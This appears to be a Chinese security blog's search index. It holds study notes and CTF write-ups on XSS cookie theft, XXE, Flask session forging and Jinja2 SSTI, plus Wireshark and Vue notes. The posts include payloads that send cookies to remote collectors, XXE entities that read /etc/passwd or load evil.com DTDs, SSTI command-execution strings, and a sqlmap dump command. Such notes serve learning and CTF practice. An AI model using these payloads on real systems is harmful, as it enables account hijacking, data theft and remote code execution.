console.log(document.getElementById(&apos;h3&apos;).innerText) // 注意： mounted 是 实例创建期间的最后一个生命周期函数，当执行完 mounted 就表示，实例已经被完全创建好了，此时，如果没有其它操作的话，这个实例，就静静的 躺在我们的内存中，一动不动 }, // 接下来的是运行中的两个事件 beforeUpdate() { // 这时候，表示 我们的界面还没有被更新【数据被更新了吗？ 数据肯定被更新了】 /* console.log(&apos;界面上元素的内容：&apos; + document.getElementById(&apos;h3&apos;).innerText) console.log(&apos;data 中的 msg 数据是：&apos; + this.msg) */ // 得出结论： 当执行 beforeUpdate 的时候，页面中的显示的数据，还是旧的，此时 data 数据是最新的，页面尚未和 最新的数据保持同步 }, updated() { console.log(&apos;界面上元素的内容：&apos; + document.getElementById(&apos;h3&apos;).innerText) console.log(&apos;data 中的 msg 数据是：&apos; + this.msg) // updated 事件执行的时候，页面和 data 数据已经保持同步了，都是最新的 } }); &lt;/script&gt;","link":"2019/02/21/Vue%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%BB%A5%E5%8F%8A%E8%BF%8E%E6%8E%A5%E6%96%B0%E7%9A%84%E5%AD%A6%E6%9C%9F/"},{"title":"Wireshark数据包分析实战","text":"一、Introduction书名Wireshark数据包分析实战第二版译者是诸葛建伟老师orz,有很多一部分讲协议分析的，这里主要记录一下Wireshark工具的使用，捕捉和显示过滤器的规则。Wireshark官方文档 二、整本书概括 三、监听网络线路1.混杂模式是从网络线路上查看所有流量的模式，即使流量不是发给本机的。正常的情况可以收到arp协议发送的广播包。 2.在集线器连接的网络中嗅探可以看到所有的流量，但是同一时刻只有一个设备可以通信，现在不常见，经常会产生冲突。 3.在交换式网络中嗅探：（正常的可视范围是本机数据包和广播数据包） 四、一些基本操作1.主界面：packet list、packet details、packet bytes 2.设置首选项：edit-&gt;preferences 3.着色规则：view-&gt;coloring rules 可以使用明显的颜色来标记关注的流量 4.查找：ctrl+F （Ctrl+B/N 前后切换） 5.标记：Ctrl+M （Shift+Ctrl+B/N 前后切换） 五、高级特性1.查看端点、会话信息 Statistics-&gt;endpoints/conversations 2.查看协议分布情况、占的比重 Statistics-&gt;Protocol Hierarchy 3.名字解析即一个用来将其地址转化成名字的协议，可能会失败，会带来额外的开销，额外的流量，每次打开一个捕获文件就要重新解析一次。 4.协议解析即将原始的比特流翻译成wireshark程序识别的协议并显示出来。比如员工用了443端口来传输ftp流量，wireshark会以ssl解析器来显示。这时，可以强制更换解析器：右键，decode as。可以查看解析器的源码来了解解析的过程，安装程序目录：epan/dissectors/。 5.跟踪TCP流可以将TCP流重组成易读的形式。 6.查看数据包的长度可以了解到是控制流量比较多还是上传下载的流量比较多。 7.图形显示： IO图IO Graph：看系统某时刻的吞吐量，看不同协议的流量传输的时间走势。双向时间图TCP-&gt;Round Trip Time：显示某个数据包一个RTT占用的时间，用来找到通信中的瓶颈。数据流图Flow Graph：将ip端口之间的交流可视化，比如可以直观的展示TCP三次握手。8.专家信息：可以用来统计数据包中某些特定状态的警告。如：tcp重传输，重复ack等。 六、两种过滤器捕捉过滤器（CaptureFilters）：用于决定将什么样的信息记录在捕捉结果中。需要在开始捕捉前设置。显示过滤器（DisplayFilters）：在捕捉结果中进行详细查找。他们可以在得到捕捉结果后随意修改。 捕捉过滤器 Protocol（协议）:可能的值: ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp.如果没有特别指明是什么协议，则默认使用所有支持的协议。 Direction（方向）:可能的值: src, dst, src and dst, src or dst如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。例如，”host 10.2.2.2″与”src or dst host 10.2.2.2″是一样的。 Host(s):可能的值： net, port, host, portrange.如果没有指定此值，则默认使用”host”关键字。例如，”src 10.1.1.1″与”src host 10.1.1.1″相同。 Logical Operations（逻辑运算）:可能的值：not, and, or.否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。 例子：tcp dst port 3128 //捕捉目的TCP端口为3128的封包。ip src host 10.1.1.1 //捕捉来源IP地址为10.1.1.1的封包。host 10.1.2.3 //捕捉目的或来源IP地址为10.1.2.3的封包。ether host e0-05-c5-44-b1-3c //捕捉目的或来源MAC地址为e0-05-c5-44-b1-3c的封包。如果你想抓本机与所有外网通讯的数据包时，可以将这里的mac地址换成路由的mac地址即可。src portrange 2000-2500 //捕捉来源为UDP或TCP，并且端口号在2000至2500范围内的封包。not imcp //显示除了icmp以外的所有封包。（icmp通常被ping工具使用）src host 10.7.2.12 and not dst net 10.200.0.0/16 //显示来源IP地址为10.7.2.12，但目的地不是10.200.0.0/16的封包。(src host 10.4.1.12 or src net 10.6.0.0/16) and tcp dst portrange 200-10000 and dst net 10.0.0.0/8 //捕捉来源IP为10.4.1.12或者来源网络为10.6.0.0/16，目的地TCP端口号在200至10000之间，并且目的位于网络 10.0.0.0/8内的所有封包。src net 192.168.0.0/24 src net 192.168.0.0 mask 255.255.255.0 //捕捉源地址为192.168.0.0网络内的所有封包。 显示过滤器例子：snmp || dns || icmp //显示SNMP或DNS或ICMP封包。 ip.addr == 10.1.1.1 //显示来源或目的IP地址为10.1.1.1的封包。ip.src != 10.1.2.3 or ip.dst != 10.4.5.6 //显示来源不为10.1.2.3或者目的不为10.4.5.6的封包。ip.src != 10.1.2.3 and ip.dst != 10.4.5.6 //显示来源不为10.1.2.3并且目的IP不为10.4.5.6的封包。tcp.port == 25 //显示来源或目的TCP端口号为25的封包。 tcp.dstport == 25 //显示目的TCP端口号为25的封包。 tcp.flags //显示包含TCP标志的封包。 tcp.flags.syn == 0&amp;times;02 //显示包含TCP SYN标志的封包。","link":"2019/05/05/Wireshark%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"},{"title":"XSS跨站脚本攻击剖析与防御","text":"cookie欺骗攻击index.php &lt;?phpsetcookie(&quot;name&quot;,&quot;cookie&quot;);if(isset($_POST[&apos;name&apos;])){echo $_POST[&apos;name&apos;];}?&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; getcookie.php &lt;?php$cookie1=$_GET[&apos;cookie&apos;];$log=fopen(&quot;demo.txt&quot;,&quot;a&quot;);fwrite($log,$cookie1.&quot;\\n&quot;);fclose($log)?&gt; payload,输入框输入 &lt;script&gt;var img = document.createElement(&apos;img&apos;);img.src = &apos;http://localhost/getcookie.php?cookie=&apos;+encodeURIComponent(document.cookie);&lt;/script&gt; 成功在demo.txt中获得cookie 一些payload&lt;img src = &quot;#&quot; onerror=alert(/xss/)&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29&quot;)&gt;&lt;/img&gt;原code:&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;&lt;/img&gt;&lt;a href=&quot;&quot; onclick=&quot;alert(1)&quot;&gt;aaaaa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29&quot;)&gt;aaaaa&lt;/a&gt; &lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt; &lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;iframe src=1 onmouseover=alert(&apos;xss&apos;) y=2016 /&gt;&lt;iframe&gt; CISCN 2019 华东北赛区 Web2方法： 投稿-》反馈-》获得管理员cookie-》注入 HTML Markup转码 in_str = &quot;(function(){window.location.href=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&apos;+escape((function(){try{return document.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return&apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return&apos;&apos;}})());})();&quot;output = &quot;&quot;for c in in_str: output += &quot;&amp;#&quot; + str(ord(c))print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;) 丢平台上后然后爆破md5 import hashlibfor i in range(1, 10000001): s = hashlib.md5(str(i).encode(&apos;utf-8&apos;)).hexdigest()[0:6] if s == &quot;4426f0&quot;: print(i) break 置管理员 cookie，猜测后台路径，发现 /admin.php 能访问。注入获取flag python sqlmap.py -u http://502ce080-5cd5-4c3d-8467-1fc354132f71.node3.buuoj.cn/admin.php?id=2 --cookie=&quot;PHPSESSID=57bd5e76b87b83da7e7332ad6f60cdd7&quot; -T flag --dump --flush-session--fresh-queries --fresh-queries --delay 0.1","link":"2019/11/19/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/"},{"title":"XXE笔记","text":"XML的小知识 1，元素元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。实例: &lt;body&gt;body text in between&lt;/body&gt;&lt;message&gt;some message in between&lt;/message&gt; 空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。 2，属性属性可提供有关元素的额外信息实例： &lt;img src=&quot;computer.gif&quot; /&gt; 3，实体实体是用来定义普通文本的变量。实体引用是对实体的引用。 4，PCDATAPCDATA 的意思是被解析的字符数据（parsed character data）。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。 5，CDATACDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。 DTD(文档类型定义)DTD实体DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 实体又分为一般实体和参数实体1，一般实体的声明语法:引用实体的方式：&amp;实体名；2，参数实体只能在DTD中使用，参数实体的声明格式： 引用实体的方式：%实体名； payLoadpayload1: &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; payload2: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note[&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1/bWAPP/robots.txt&quot;&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; payload3 Linux: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;aaa&gt;&amp;b;&lt;/aaa&gt; payload4 windows: &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; payload5 远程加载： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % one SYSTEM &quot;http://evil.com/evil.dtd&quot; &gt; %one; %two; %four;]&gt; &lt;!ENTITY % three SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % two &quot;&lt;!ENTITY % four SYSTEM &apos;file:///%three;&apos;&gt;&quot;&gt; &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt; https://xz.aliyun.com/t/3357","link":"2019/09/01/XXE%E7%AC%94%E8%AE%B0/"},{"title":"flask中session的那些事","text":"楔子在写HCTF2018-admin题目的时候，遇到了flask中session伪造的问题，打算研究一下 一、cookie和session的一些小姿势1、cookie：在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登录成功后，第二次请求服务器依然不能知道当前请求是哪个用户。cookie的出现就是为了解决这个问题，第一次登录后服务器返回一些数据（cookie）给浏览器，然后浏览器保存在本地，当该用户发送第二次请求的时候，就会自动的把上次请求存储的cookie数据自动的携带给服务器，服务器通过浏览器携带的数据就能判断当前用户是哪个了。cookie存储的数据量有限，不同的浏览器有不同的存储大小，但一般不超过4KB。因此使用cookie只能存储一些小量的数据。 2、session:session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。存储在服务器的数据会更加的安全，不容易被窃取。但存储在服务器也有一定的弊端，就是会占用服务器的资源，但现在服务器已经发展至今，一些session信息还是绰绰有余的。 3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式： 1、存储在服务端：通过cookie存储一个session_id，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个session_id，下次再次请求的时候，会把该session_id携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做server side session。 2、将session数据加密，然后存储在cookie中。这种专业术语叫做client side session。flask采用的就是这种方式，但是也可以替换成其他形式。 二、源码分析一下他的session存储在客户端的cookie字段中，为了防止session篡改，flask进行了如下的处理，代码存放在flask模块中python3\\Lib\\site-packages\\flask\\sessions.py文件中。 class SecureCookieSessionInterface(SessionInterface): &quot;&quot;&quot;The default session interface that stores sessions in signed cookies through the :mod:`itsdangerous` module. &quot;&quot;&quot; #: the salt that should be applied on top of the secret key for the #: signing of cookie based sessions. salt = &quot;cookie-session&quot; #: the hash function to use for the signature. The default is sha1 digest_method = staticmethod(hashlib.sha1) #: the name of the itsdangerous supported key derivation. The default #: is hmac. key_derivation = &quot;hmac&quot; #: A python serializer for the payload. The default is a compact #: JSON derived serializer with support for some extra Python types #: such as datetime objects or tuples. serializer = session_json_serializer session_class = SecureCookieSession def get_signing_serializer(self, app): if not app.secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer( app.secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs, ) 最后生成的session长这样json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息比如我生成这样的eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn4pw.6KQvoMiQZo1Ttjr4dFJ7e0AN45U这是由{&apos;_permanent&apos;: True, &apos;username&apos;: &apos;st4ck&apos;}，密钥为admin生成的 三、flask的session实战from flask import Flask,sessionimport osfrom datetime import timedeltaapp = Flask(__name__)app.config[&apos;SECRET_KEY&apos;]=&apos;admin&apos; #设置为24位的字符,每次运行服务器都是不同的，所以服务器启动一次上次的session就清除。app.config[&apos;PERMANENT_SESSION_LIFETIME&apos;]=timedelta(days=7) #设置session的保存时间。@app.route(&apos;/&apos;)def hello_world(): session.permanent=True #默认session的时间持续31天 session[&apos;username&apos;] = &apos;st4ck&apos; return &apos;Hello World!&apos;#获取session@app.route(&apos;/get/&apos;)def get(): return session.get(&apos;username&apos;)#删除session@app.route(&apos;/delete/&apos;)def delete(): print(session.get(&apos;username&apos;)) session.pop(&apos;username&apos;) print(session.get(&apos;username&apos;)) return &apos;delete&apos;#清楚session@app.route(&apos;/clear/&apos;)def clear(): print(session.get(&apos;username&apos;)) session.clear() print(session.get(&apos;username&apos;)) return &apos;clear&apos;if __name__ == &apos;__main__&apos;: app.run(debug=True) 我们运行/,然后get请求后获得 获得session为 eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y 四、session安全问题其实生成上面的session居然是可以破解的！！！但是没有SECRET_KEY我们无法伪造，可以选择爆破但是一定要拿到SECRET_KEY才能伪造 方法1：使用工具安装$ pip3 install flask-unsign命令行就可以直接使用$ flask-unsign C:\\Users\\38138\\Desktop&gt;flask-unsign --sign --cookie &quot;{&apos;_permanent&apos;: True, &apos;username&apos;: &apos;st4ck&apos;}&quot; --secret &quot;secret&quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4C:\\Users\\38138\\Desktop&gt;flask-unsign --decode --cookie &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4&quot;{&apos;_permanent&apos;: True, &apos;username&apos;: &apos;st4ck&apos;} 爆破key flask-unsign --unsign --cookie &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6Imd1ZXN0In0.Xm2ZFg.-quLR22o3jUH0PzdlVtj4m4Aecg&quot; 方法2：使用脚本import sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0 raise Exception(&apos;Must be using at least Python 3&apos;)elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 from abc import ABCMeta, abstractmethodelse: # &gt; 3.4 from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 class FSCM(metaclass=ABCMeta): def encode(secret_key, session_cookie_structure): &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot; try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return &quot;[Encoding error] {}&quot;.format(e) raise e def decode(session_cookie_value, secret_key=None): &quot;&quot;&quot; Decode a Flask cookie &quot;&quot;&quot; try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith(&apos;.&apos;): compressed = True payload = payload[1:] data = payload.split(&quot;.&quot;)[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return &quot;[Decoding error] {}&quot;.format(e) raise eelse: # &gt; 3.4 class FSCM(ABC): def encode(secret_key, session_cookie_structure): &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot; try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return &quot;[Encoding error] {}&quot;.format(e) raise e def decode(session_cookie_value, secret_key=None): &quot;&quot;&quot; Decode a Flask cookie &quot;&quot;&quot; try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith(&apos;.&apos;): compressed = True payload = payload[1:] data = payload.split(&quot;.&quot;)[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return &quot;[Decoding error] {}&quot;.format(e) raise eif __name__ == &quot;__main__&quot;: print(FSCM.decode(&quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y&quot;)) 参考flask session 加解密工具：https://github.com/noraj/flask-session-cookie-managerSECRET_KEY 爆破工具:https://github.com/Paradoxis/Flask-Unsign 五、[HCTF 2018]admin有一个注册界面 我们注册一个 st4ck 123qwe 的账号，然后session解密 C:\\Users\\38138\\Desktop&gt;flask-unsign --decode --cookie &quot;.eJw9kEGLwjAQhf_KkrOHNtaL4GGX1mBhJlRSQ-Yibq22iXGhVagR__sGF_YwpzfvmzfvyfanoR07trwN93bG9v2RLZ_s45stGaiaS00dCfMgv-viOLKlB2-C1NVE-WZOAjIpSkd5aY1eXyBsFlIXKYqdx5wcKbRkPzOpHCfVpKQ2E-RowRcLE1wGAeZojz3wnUNecxPvyBwSFOtOiopL1cQMdQIaHSo3kS57UFsHNu5Y7I0vONpqxV4z1ozDaX_7ce31_wUUeCFLF1TnCfMqWiCR6uhRw0Sq7CA0D7ImRoBA6stjKFKqVm9c7w_n9p_Urrdlff5TrgcfBTbessaxGbuP7fDujaUJe_0C4HFsfw.Xbn_9Q.LN7SQgH0-wJ_7nD5E8h8KRKXEKM&quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664&apos;, &apos;csrf_token&apos;: b&apos;4cef6e58144463497f5c1e2a372f67633e0f715e&apos;, &apos;image&apos;: b&apos;xTIR&apos;, &apos;name&apos;: &apos;st4ck&apos;, &apos;user_id&apos;: &apos;10&apos;} 在修改密码的地方获得github地址https://github.com/woadsl1234/hctf_flask/在config.py里获得SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;于是我们拿着ckj123来伪造 C:\\Users\\38138\\Desktop&gt;flask-unsign --sign --cookie &quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664&apos;, &apos;csrf_token&apos;: b&apos;4cef6e58144463497f5c1e2a372f67633e0f715e&apos;, &apos;image&apos;: b&apos;xTIR&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot; --secret &quot;ckj123&quot;.eJw9kEGLwjAQhf_KkrOHNupF8LBLa7AwEyqpIXMRbattYlyoCjXif9_ggoc5vXnfvHlPtjsO7bVji9twbyds1zds8WRfB7ZgoCouNXUkzIP8tovjyBYevAlSlyNl6ykJmElROMoKa_TqDGE9lzpPUWw9ZuRIoSX7PZPKcVJ1Smo9QoYWfD43wc0gwBRt0wPfOuQVN_GOzCBBseqkKLlUdcxQJaDRoXIj6aIHtXFg447F3vicoy2X7DVh9XU47m6_rr18XkCBZ7J0RnUaMSujBRKpGo8aRlJFB6F-kDUxAgRSPx5DnlK5fON6vz-1H1K72hTV6V-57H0U2L7x_YVN2P3aDu_eWJqw1x_isWyf.XboBVw.SUcm9Kffci1R5O3u9w-lcq21QMo 在浏览器修改cookie中的session值后直接就拿到了flag","link":"2019/11/19/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"title":"从flask到SSTI","text":"flask基础知识from flask import Flaskapp=Flask(__name__)@app.route(&apos;/&apos;)def hello_world(): return &quot;hello World！&quot;if __name__==&apos;__main__&apos;: app.debug = True app.run(host=&apos;0.0.0.0&apos;,port=80) 调试模式有两种途径来启用调试模式。一种是直接在应用对象上设置: app.debug = Trueapp.run() 另一种是作为 run 方法的一个参数传入: app.run(debug=True) 两种方法的效果完全相同。 run函数参数def run(self, host=None, port=None, debug=None, **options): 参数 host：主机，在使用run()启动服务的时候指定的IP地址，默认情况下是127.0.0.1port：端口，是run()启动服务的时候指定的运行端口，默认是5000debug：调试，如果需要进入调试模式，可以将这个选项设置成tureoptions:选项参数是将server的参数传送到Werkzeug server去处理。详情参考链接内容。 请求@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;, &apos;GET&apos;])def login(): error = None if request.method == &apos;POST&apos;: if valid_login(request.form[&apos;username&apos;], request.form[&apos;password&apos;]): return log_the_user_in(request.form[&apos;username&apos;]) else: error = &apos;Invalid username/password&apos; # the code below is executed if the request method # was GET or the credentials were invalid return render_template(&apos;login.html&apos;, error=error) 文件上传from flask import request@app.route(&apos;/upload&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def upload_file(): if request.method == &apos;POST&apos;: f = request.files[&apos;the_file&apos;] f.save(&apos;/var/www/uploads/uploaded_file.txt&apos;) ... 如果你想知道上传前文件在客户端的文件名是什么，你可以访问 filename 属性。但请记住， 永远不要信任这个值，这个值是可以伪造的。如果你要把文件按客户端提供的文件名存储在服务器上，那么请把它传递给 Werkzeug 提供的 secure_filename() 函数: from flask import requestfrom werkzeug import secure_filename@app.route(&apos;/upload&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def upload_file(): if request.method == &apos;POST&apos;: f = request.files[&apos;the_file&apos;] f.save(&apos;/var/www/uploads/&apos; + secure_filename(f.filename)) ... cookie设置cookie @app.route(&apos;/cookie&apos;)def set_cookie(): resp = make_response(&apos;set_cookie&apos;) resp.set_cookie(&apos;name&apos;, &apos;123456&apos;) return resp 获得cookie @app.route(&apos;/hello&apos;)def render1(name=None): name = request.cookies.get(&apos;name&apos;) return render_template(&apos;hello.html&apos;,name=name) 删除cookie @app.route(&apos;/del_cookie&apos;)def show_post(): resp = make_response(&apos;delete_cookie&apos;) resp.delete_cookie(&apos;name&apos;) return resp 重定向@app.route(&apos;/cookie&apos;)def login(): return redirect(url_for(&apos;hello&apos;))@app.route(&apos;/hello&apos;)def hello(name=None): name = request.cookies.get(&apos;name&apos;) return render_template(&apos;hello.html&apos;,name=name) sessionfrom flask import Flask, session, redirect, url_for, escape, requestapp = Flask(__name__)@app.route(&apos;/&apos;)def index(): if &apos;username&apos; in session: return &apos;Logged in as %s&apos; % escape(session[&apos;username&apos;]) return &apos;You are not logged in&apos;@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def login(): if request.method == &apos;POST&apos;: session[&apos;username&apos;] = request.form[&apos;username&apos;] return redirect(url_for(&apos;index&apos;)) return &apos;&apos;&apos; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;p&gt;&lt;input type=text name=username&gt; &lt;p&gt;&lt;input type=submit value=Login&gt; &lt;/form&gt; &apos;&apos;&apos;@app.route(&apos;/logout&apos;)def logout(): # remove the username from the session if it&apos;s there session.pop(&apos;username&apos;, None) return redirect(url_for(&apos;index&apos;))# set the secret key. keep this really secret:app.secret_key = &apos;A0Zr98j/3yX R~XHH!jmN]LWX/,?RT&apos; 模板注入xss @app.route(&apos;/xss/&apos;)def hello(name=None): code = request.args.get(&apos;id&apos;) html = &apos;&apos;&apos; &lt;h3&gt;%s&lt;/h3&gt; &apos;&apos;&apos;%(code) return render_template_string(html) payload http://192.168.199.246/xss/?id=&lt;script&gt;alert(1)&lt;/script&gt; 防御 @app.route(&apos;/test/&apos;)def test(): code = request.args.get(&apos;id&apos;) return render_template_string(&apos;&lt;h1&gt;{{ code }}&lt;/h1&gt;&apos;,code=code) 可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的 SSTI文件读取/命令执行服务器模板注入SSTI基础在Jinja2模板引擎中，是变量包裹标识符。并不仅仅可以传递变量，还可以执行一些简单的表达式。代码同xsspayloadhttp://192.168.199.246/ssti/?id=6查看flask配置 http://192.168.199.246/ssti/?id={{config}} python2/3的命令执行和文件包含python2文件读取或者写入 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/etc/passwd&apos;).read()}}{{&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()}} 任意文件写 {{&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;,&apos;w&apos;).write(&apos;code&apos;)}} 执行,先通过上一步的写，然后执行 {{ config.from_pyfile(&apos;/tmp/owned.cfg&apos;) }} 执行 http://111.198.29.45:42293/{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&apos; )}} python3任意文件读取 http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;d://whale.txt&apos;).read()}} 一句指令任意执行 http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;)}} 一个payload2.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,来查看所有模块 3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个 4.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中 